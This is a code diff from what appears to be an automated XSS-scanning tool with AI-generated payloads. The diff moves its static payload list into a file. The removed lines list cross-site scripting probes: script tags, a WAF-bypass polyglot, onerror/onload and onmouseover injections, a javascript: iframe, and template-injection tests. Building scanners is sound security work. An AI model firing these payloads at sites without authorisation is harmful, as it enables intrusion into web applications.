@@ -17,29 +17,8 @@ from src.core.prompts.xss import XSS_GENERATOR_PROMPT, XSS_ANALYZER_PROMPT
 class XSSNodes(BaseVulnNodes):
     def __init__(self):
         super().__init__(retry_key="xss_retry_count")
-
-    # 静态 XSS Payloads (混合了 Polyglot, 常用标签, 事件处理器, WAF 绕过)
-    STATIC_PAYLOADS = [
-        # Basic
-        "<script>alert(1)</script>",
-        "\"><script>alert(1)</script>",
-        # Polyglot (from various lists)
-        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
-        "\";alert(1)//",
-        # Attributes
-        "\" onmouseover=alert(1) //",
-        "' onmouseover=alert(1) //",
-        # IMG/SVG (No Script Tag)
-        "<img src=x onerror=alert(1)>",
-        "<svg/onload=alert(1)>",
-        # Iframe
-        "<iframe/src=javascript:alert(1)>",
-        # Body/Event
-        "<body onload=alert(1)>",
-        # Angular/Vue/Framework specific (generic detection)
-        "{{7*7}}",
-        "${7*7}"
-    ]
+        # 从文件加载静态 Payloads
+        self.STATIC_PAYLOADS = self._load_static_payloads("src/core/payloads/xss.txt")
 
     async def strategist_node(self, state: XSSState) -> dict:
         """调用通用引擎生成 XSS Payload"""
